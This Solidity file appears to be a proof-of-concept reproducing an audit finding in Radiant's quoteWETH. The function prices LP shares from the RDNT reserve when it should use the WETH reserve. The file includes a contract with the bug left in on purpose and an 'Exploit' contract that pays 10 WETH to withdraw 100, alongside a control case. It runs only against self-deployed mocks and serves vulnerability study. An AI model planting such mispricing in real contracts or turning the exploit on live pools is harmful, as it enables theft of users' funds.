// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

/*  Radiant — quoteWETH multiplies the RDNT reserve, not the WETH reserve
    (Pashov H-01, finding 31663).
    Reserves: 1000 WETH and 100 RDNT, LP supply 100. Quoting 10 LP returns 10
    WETH. The WETH reserve would return 100. The zap charges 10 and releases
    the 100 WETH the LP share is worth. The caller keeps 90. The control quotes
    with the WETH reserve, so the charge is 100 and the caller keeps 0. */

contract Asset {
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        require(balanceOf[msg.sender] >= amount, "bal");
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        require(balanceOf[from] >= amount, "bal");
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract UniswapPoolHelper {
    address public rdntAddr = address(0xB0B);
    address public token0;
    uint256 public reserve0;
    uint256 public reserve1;
    uint256 public totalSupply;
    uint256 public quoted;
    uint256 public fair;
    Asset public weth;

    constructor(Asset weth_) {
        weth = weth_;
        token0 = address(weth_);
        reserve0 = 1_000 ether;
        reserve1 = 100 ether;
        totalSupply = 100 ether;
    }

    function quoteWETH(uint256 lpAmount) external returns (uint256 neededWeth) {
        uint256 wethReserve = token0 != rdntAddr ? reserve0 : reserve1;
        uint256 rdnt = token0 == rdntAddr ? reserve0 : reserve1;
        uint256 lpTokenSupply = totalSupply;
        fair = (wethReserve * lpAmount) / lpTokenSupply;
        // @> VULN: neededWeth is taken from the RDNT reserve, not the WETH reserve
        neededWeth = (rdnt * lpAmount) / lpTokenSupply;
        quoted = neededWeth;
    }

    function quoteFair(uint256 lpAmount) external view returns (uint256) {
        uint256 wethReserve = token0 != rdntAddr ? reserve0 : reserve1;
        uint256 lpTokenSupply = totalSupply;
        return (wethReserve * lpAmount) / lpTokenSupply;
    }

    function zap(uint256 lpAmount) external returns (uint256 charged, uint256 released) {
        charged = this.quoteWETH(lpAmount);
        released = fair;
        require(weth.transferFrom(msg.sender, address(this), charged), "pull");
        require(weth.transfer(msg.sender, released), "lp weth");
    }
}

contract Exploit {
    uint256 public constant LP_AMOUNT = 10 ether;
    Asset public weth;
    UniswapPoolHelper public helper;
    uint256 public charged;
    uint256 public released;
    uint256 public kept;
    uint256 public controlCharged;

    constructor() {
        weth = new Asset();
        helper = new UniswapPoolHelper(weth);
    }

    function run() external {
        weth.mint(address(helper), 1_000 ether);
        weth.mint(address(this), 10 ether);
        (charged, released) = helper.zap(LP_AMOUNT);
        kept = weth.balanceOf(address(this));
        require(helper.quoted() == 10 ether, "wrong");
        require(helper.fair() == 100 ether, "fair");
        require(charged == 10 ether, "charged");
        require(released == 100 ether, "released");
        require(kept == 100 ether, "kept");
        require(released > charged, "underpaid");
    }

    function runControl() external {
        controlCharged = helper.quoteFair(LP_AMOUNT);
        require(controlCharged == 100 ether, "fair quote");
        require(controlCharged > 10 ether, "above the buggy quote");
        weth.mint(address(this), controlCharged);
        require(weth.transfer(address(helper), controlCharged), "pay fair");
        require(weth.balanceOf(address(this)) == 0, "no leftover");
    }
}
